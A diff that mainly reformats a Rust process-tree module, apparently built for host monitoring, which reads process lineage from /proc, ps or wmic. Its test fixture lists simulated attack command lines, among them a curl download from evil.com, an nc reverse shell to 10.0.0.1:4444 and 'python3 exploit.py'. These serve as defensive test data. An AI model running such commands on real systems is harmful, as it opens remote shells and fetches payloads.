@@ -44,9 +44,10 @@ impl ProcessTree {
         if let Some(old_node) = self.nodes.get(&pid) {
             let old_ppid = old_node.ppid;
             if old_ppid != ppid
-                && let Some(siblings) = self.children.get_mut(&old_ppid) {
-                    siblings.retain(|&p| p != pid);
-                }
+                && let Some(siblings) = self.children.get_mut(&old_ppid)
+            {
+                siblings.retain(|&p| p != pid);
+            }
         }
         self.nodes.insert(pid, node);
         let children = self.children.entry(ppid).or_default();
@@ -69,7 +70,8 @@ impl ProcessTree {
 
     /// Get direct children of a PID.
     pub fn children_of(&self, pid: u32) -> Vec<&ProcessNode> {
-        self.children.get(&pid)
+        self.children
+            .get(&pid)
             .map(|pids| pids.iter().filter_map(|p| self.nodes.get(p)).collect())
             .unwrap_or_default()
     }
@@ -81,9 +83,13 @@ impl ProcessTree {
         let mut visited = std::collections::HashSet::new();
 
         while let Some(node) = self.nodes.get(&current) {
-            if !visited.insert(current) { break; } // Cycle protection
+            if !visited.insert(current) {
+                break;
+            } // Cycle protection
             result.push(node);
-            if node.ppid == 0 || node.ppid == current { break; }
+            if node.ppid == 0 || node.ppid == current {
+                break;
+            }
             current = node.ppid;
         }
         result
@@ -109,7 +115,8 @@ impl ProcessTree {
     /// Find processes by name (case-insensitive substring match).
     pub fn find_by_name(&self, name: &str) -> Vec<&ProcessNode> {
         let nl = name.to_lowercase();
-        self.nodes.values()
+        self.nodes
+            .values()
             .filter(|n| n.name.to_lowercase().contains(&nl))
             .collect()
     }
@@ -117,8 +124,13 @@ impl ProcessTree {
     /// Find processes by command line pattern.
     pub fn find_by_cmdline(&self, pattern: &str) -> Vec<&ProcessNode> {
         let pl = pattern.to_lowercase();
-        self.nodes.values()
-            .filter(|n| n.cmd_line.as_ref().is_some_and(|c| c.to_lowercase().contains(&pl)))
+        self.nodes
+            .values()
+            .filter(|n| {
+                n.cmd_line
+                    .as_ref()
+                    .is_some_and(|c| c.to_lowercase().contains(&pl))
+            })
             .collect()
     }
 
@@ -176,16 +188,24 @@ impl ProcessTree {
                     if let Ok(stat) = fs::read_to_string(&stat_path) {
                         let parts: Vec<&str> = stat.split_whitespace().collect();
                         if parts.len() > 3 {
-                            let proc_name = parts[1].trim_matches(|c| c == '(' || c == ')').to_string();
+                            let proc_name =
+                                parts[1].trim_matches(|c| c == '(' || c == ')').to_string();
                             let ppid = parts[3].parse::<u32>().unwrap_or(0);
                             let cmd_line = fs::read_to_string(format!("/proc/{}/cmdline", pid))
                                 .ok()
                                 .map(|s| s.replace('\0', " ").trim().to_string())
                                 .filter(|s| !s.is_empty());
                             self.upsert(ProcessNode {
-                                pid, ppid, name: proc_name, cmd_line,
-                                start_time: None, user: None, exe_path: None, exe_hash: None,
-                                hostname: self.hostname.clone(), alive: true,
+                                pid,
+                                ppid,
+                                name: proc_name,
+                                cmd_line,
+                                start_time: None,
+                                user: None,
+                                exe_path: None,
+                                exe_hash: None,
+                                hostname: self.hostname.clone(),
+                                alive: true,
                             });
                         }
                     }
@@ -204,14 +224,22 @@ impl ProcessTree {
             for line in stdout.lines().skip(1) {
                 let parts: Vec<&str> = line.split_whitespace().collect();
                 if parts.len() >= 3
-                    && let (Ok(pid), Ok(ppid)) = (parts[0].parse::<u32>(), parts[1].parse::<u32>()) {
-                        let name = parts[2..].join(" ");
-                        self.upsert(ProcessNode {
-                            pid, ppid, name, cmd_line: None,
-                            start_time: None, user: None, exe_path: None, exe_hash: None,
-                            hostname: self.hostname.clone(), alive: true,
-                        });
-                    }
+                    && let (Ok(pid), Ok(ppid)) = (parts[0].parse::<u32>(), parts[1].parse::<u32>())
+                {
+                    let name = parts[2..].join(" ");
+                    self.upsert(ProcessNode {
+                        pid,
+                        ppid,
+                        name,
+                        cmd_line: None,
+                        start_time: None,
+                        user: None,
+                        exe_path: None,
+                        exe_hash: None,
+                        hostname: self.hostname.clone(),
+                        alive: true,
+                    });
+                }
             }
         }
     }
@@ -219,7 +247,12 @@ impl ProcessTree {
     #[cfg(target_os = "windows")]
     fn collect_windows(&mut self) {
         if let Ok(output) = std::process::Command::new("wmic")
-            .args(["process", "get", "ProcessId,ParentProcessId,Name", "/format:csv"])
+            .args([
+                "process",
+                "get",
+                "ProcessId,ParentProcessId,Name",
+                "/format:csv",
+            ])
             .output()
         {
             let stdout = String::from_utf8_lossy(&output.stdout);
@@ -227,11 +260,20 @@ impl ProcessTree {
                 let parts: Vec<&str> = line.split(',').collect();
                 if parts.len() >= 4 {
                     let name = parts[1].to_string();
-                    if let (Ok(ppid), Ok(pid)) = (parts[2].parse::<u32>(), parts[3].trim().parse::<u32>()) {
+                    if let (Ok(ppid), Ok(pid)) =
+                        (parts[2].parse::<u32>(), parts[3].trim().parse::<u32>())
+                    {
                         self.upsert(ProcessNode {
-                            pid, ppid, name, cmd_line: None,
-                            start_time: None, user: None, exe_path: None, exe_hash: None,
-                            hostname: self.hostname.clone(), alive: true,
+                            pid,
+                            ppid,
+                            name,
+                            cmd_line: None,
+                            start_time: None,
+                            user: None,
+                            exe_path: None,
+                            exe_hash: None,
+                            hostname: self.hostname.clone(),
+                            alive: true,
                         });
                     }
                 }
@@ -246,12 +288,78 @@ mod tests {
 
     fn sample_tree() -> ProcessTree {
         let mut tree = ProcessTree::new("test-host");
-        tree.upsert(ProcessNode { pid: 1, ppid: 0, name: "init".into(), cmd_line: Some("/sbin/init".into()), start_time: None, user: Some("root".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
-        tree.upsert(ProcessNode { pid: 100, ppid: 1, name: "sshd".into(), cmd_line: Some("/usr/sbin/sshd -D".into()), start_time: None, user: Some("root".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
-        tree.upsert(ProcessNode { pid: 200, ppid: 100, name: "bash".into(), cmd_line: Some("/bin/bash".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
-        tree.upsert(ProcessNode { pid: 300, ppid: 200, name: "python3".into(), cmd_line: Some("python3 exploit.py".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
-        tree.upsert(ProcessNode { pid: 301, ppid: 200, name: "curl".into(), cmd_line: Some("curl http://evil.com/payload".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
-        tree.upsert(ProcessNode { pid: 400, ppid: 300, name: "nc".into(), cmd_line: Some("nc -e /bin/sh 10.0.0.1 4444".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
+        tree.upsert(ProcessNode {
+            pid: 1,
+            ppid: 0,
+            name: "init".into(),
+            cmd_line: Some("/sbin/init".into()),
+            start_time: None,
+            user: Some("root".into()),
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test-host".into(),
+            alive: true,
+        });
+        tree.upsert(ProcessNode {
+            pid: 100,
+            ppid: 1,
+            name: "sshd".into(),
+            cmd_line: Some("/usr/sbin/sshd -D".into()),
+            start_time: None,
+            user: Some("root".into()),
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test-host".into(),
+            alive: true,
+        });
+        tree.upsert(ProcessNode {
+            pid: 200,
+            ppid: 100,
+            name: "bash".into(),
+            cmd_line: Some("/bin/bash".into()),
+            start_time: None,
+            user: Some("user".into()),
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test-host".into(),
+            alive: true,
+        });
+        tree.upsert(ProcessNode {
+            pid: 300,
+            ppid: 200,
+            name: "python3".into(),
+            cmd_line: Some("python3 exploit.py".into()),
+            start_time: None,
+            user: Some("user".into()),
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test-host".into(),
+            alive: true,
+        });
+        tree.upsert(ProcessNode {
+            pid: 301,
+            ppid: 200,
+            name: "curl".into(),
+            cmd_line: Some("curl http://evil.com/payload".into()),
+            start_time: None,
+            user: Some("user".into()),
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test-host".into(),
+            alive: true,
+        });
+        tree.upsert(ProcessNode {
+            pid: 400,
+            ppid: 300,
+            name: "nc".into(),
+            cmd_line: Some("nc -e /bin/sh 10.0.0.1 4444".into()),
+            start_time: None,
+            user: Some("user".into()),
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test-host".into(),
+            alive: true,
+        });
         tree
     }
 
@@ -331,8 +439,30 @@ mod tests {
     fn cycle_protection() {
         let mut tree = ProcessTree::new("test");
         // Create a cycle: A -> B -> A
-        tree.upsert(ProcessNode { pid: 10, ppid: 20, name: "a".into(), cmd_line: None, start_time: None, user: None, exe_path: None, exe_hash: None, hostname: "test".into(), alive: true });
-        tree.upsert(ProcessNode { pid: 20, ppid: 10, name: "b".into(), cmd_line: None, start_time: None, user: None, exe_path: None, exe_hash: None, hostname: "test".into(), alive: true });
+        tree.upsert(ProcessNode {
+            pid: 10,
+            ppid: 20,
+            name: "a".into(),
+            cmd_line: None,
+            start_time: None,
+            user: None,
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test".into(),
+            alive: true,
+        });
+        tree.upsert(ProcessNode {
+            pid: 20,
+            ppid: 10,
+            name: "b".into(),
+            cmd_line: None,
+            start_time: None,
+            user: None,
+            exe_path: None,
+            exe_hash: None,
+            hostname: "test".into(),
+            alive: true,
+        });
         let lineage = tree.lineage(10);
         assert!(lineage.len() <= 2, "Cycle should be detected");
     }
